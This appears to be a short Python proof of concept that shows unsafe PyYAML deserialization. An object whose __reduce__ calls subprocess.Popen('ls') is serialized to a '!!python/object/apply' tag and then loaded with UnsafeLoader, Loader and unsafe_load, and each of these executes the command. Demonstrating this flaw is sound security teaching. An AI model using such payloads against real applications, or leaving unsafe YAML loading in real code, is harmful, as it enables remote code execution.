import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
